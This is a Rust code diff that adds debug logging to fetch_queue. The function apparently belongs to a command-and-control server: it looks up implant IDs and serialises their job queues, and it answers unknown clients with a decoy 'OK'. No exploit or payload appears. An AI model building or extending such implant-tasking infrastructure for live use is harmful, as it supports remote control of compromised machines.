@@ -9,15 +9,26 @@ use crate::database::IMPLANT_DB;
 /// Returns Hex encoded JobData OR empty string
 pub async fn fetch_queue(request: &HeaderMap) -> anyhow::Result<Vec<u8>> {
     let id = match IMPLANT_DB.parse_implant_id(request).await? {
-        Some(v) => v,
-        None => return Ok(b"OK".to_vec()),
+        Some(v) => {
+            debug!("valid id: {}", v);
+            v
+        },
+        None => {
+            debug!("invalid id");
+            return Ok(b"OK".to_vec())
+        },
     };
 
     let implant = match IMPLANT_DB.fetch_implant(id).await? {
-        Some(v) => v,
-        None => return Ok(b"OK".to_vec()),
+        Some(v) => {
+            debug!("implant exists: {:?}", v);
+            v
+        },
+        None => {
+            debug!("implant doesn't exist");
+            return Ok(b"OK".to_vec())
+        },
     };
-    debug!("valid client: {}", id);
 
     let mut jobs = Vec::new();
     for job in implant.queue {
@@ -31,6 +42,7 @@ pub async fn fetch_queue(request: &HeaderMap) -> anyhow::Result<Vec<u8>> {
         };
     }
 
+    debug!("jobs: {:?}", jobs);
     let serialized = postcard::to_allocvec(&NetJobList { jobs })?;
 
     Ok(serialized)
